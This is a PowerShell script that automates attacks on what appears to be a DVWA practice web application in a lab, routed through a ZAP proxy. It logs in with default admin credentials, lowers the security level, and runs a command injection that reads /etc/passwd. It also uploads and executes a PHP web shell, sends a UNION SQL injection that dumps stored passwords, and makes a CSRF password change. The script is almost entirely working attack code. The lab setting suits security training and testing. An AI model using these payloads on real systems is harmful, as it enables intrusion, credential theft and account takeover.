#---------------------------------------------------------------------------------------------------------------------------
# Load Resurces
#---------------------------------------------------------------------------------------------------------------------------
$homePage = "http://192.168.43.157:5001"
$zap_proxy = "http://172.22.225.205:8082" 

Clear-Host


$dict = @{}

$values = Import-Csv -Path ("$PSScriptRoot\Resources\Menu.csv") -Delimiter '|' -Header Key,value 
$values | foreach($_){$dict.Add($_.key,$_.Value);}

#---------------------------------------------------------------------------------------------------------------------------
# Login
#---------------------------------------------------------------------------------------------------------------------------

$rb = $null

$pet = wget $homePage -SessionVariable rb -Proxy $zap_proxy 
$rb.Headers.Add("Content-Type","application/x-www-form-urlencoded")


$body = "username=admin&password=password&Login=Login&user_token={0}" -f $pet.Forms[0].Fields.user_token

$response = wget "$homePage/login.php" -WebSession $rb -Method Post -Body $body -Proxy $zap_proxy 


$response.ParsedHtml.getElementById('system_info').innerText

#---------------------------------------------------------------------------------------------------------------------------
# Set Security level low
#---------------------------------------------------------------------------------------------------------------------------

$response = $null
$response = wget "$homePage/security.php" -WebSession $rb -Proxy $zap_proxy 
$select = $response.ParsedHtml.getElementsByName('security').item(0)
$select.value = "low"
$select.value


#---------------------------------------------------------------------------------------------------------------------------
# Command injection attack
#---------------------------------------------------------------------------------------------------------------------------
$rute = "$homePage/{0}" -f $dict["sqlInjection"]

$response = wget "$rute" -WebSession $rb -Proxy $zap_proxy 
$body = "ip=127.0.0.1+%26+cat+%2fetc%2fpasswd&Submit=Submit"
$response = wget "$homePage/vulnerabilities/exec/" -Method Post -Body $body -WebSession $rb -Proxy $zap_proxy 
$response.ParsedHtml.getElementsByTagName('pre').item(0).innertext


#---------------------------------------------------------------------------------------------------------------------------
# Upload File attack
#---------------------------------------------------------------------------------------------------------------------------
$rute = "$homePage/{0}" -f $dict["upload"]
$response = wget "$rute" -WebSession $rb -Proxy $zap_proxy 


#$body = Get-Content("$PSScriptRoot\Resources\hack.php") -Raw
$fileBin = [System.IO.File]::ReadAlltext("$PSScriptRoot\Resources\hack.php")
$boundary = "-----------------------------{0}" -f [System.Guid]::NewGuid().ToString()

$LF = "`r`n"
$bodyLines = (
    "--$boundary$LF",
    "Content-Disposition: form-data; name=`"file`"; filename=`"hack_2.php`"",
    "Content-Type: application/octet-stream$LF",
    "$fileBin",
    "--$boundary--$LF"
) -join $LF

$response  = wget -Uri $rute -Method Post -WebSession $rb -ContentType "multipart/form-data; boundary=""$boundary""" -Body $bodyLines -Proxy $zap_proxy 
#$response = Invoke-RestMethod -Uri $rute -Method Post -ContentType "multipart/form-data" -Body -Proxy "http://172.22.225.205:8082"
#$response = wget $rute -WebSession $rb -Method Post -Body $body -Proxy "http://172.22.225.205:8082" 

$response = wget "$homePage/hackable/uploads/hack_2.php" -WebSession $rb -Proxy $zap_proxy 
$t= $response.ParsedHtml.getElementsByTagName('table').item(1)
$t.children[0].children[0].innerText
 
#---------------------------------------------------------------------------------------------------------------------------
# SQLi attack
#---------------------------------------------------------------------------------------------------------------------------

$rute = "$homePage/{0}" -f $dict["sqli"]
$response = wget "$rute" -WebSession $rb -Proxy $zap_proxy 


$response = wget "$rute`?id=%25%27+union+select+user%2Cpassword+from+users%23&Submit=Submit" -WebSession $rb -Proxy $zap_proxy 
$response.ParsedHtml.getElementsByTagName('pre').item(0).innertext

#---------------------------------------------------------------------------------------------------------------------------
# Cross-Site Request Forgery (CSRF) attack
#---------------------------------------------------------------------------------------------------------------------------
$rute = "$homePage/{0}" -f $dict["csrf"]
$response = wget "$rute" -WebSession $rb -Proxy $zap_proxy 



$response = wget ("$rute{0}" -f ("?password_new=patata&password_conf=patata&Change=Change")) -WebSession $rb -Proxy $zap_proxy 
$response.ParsedHtml.getElementsByTagName('pre').item(0).innertext
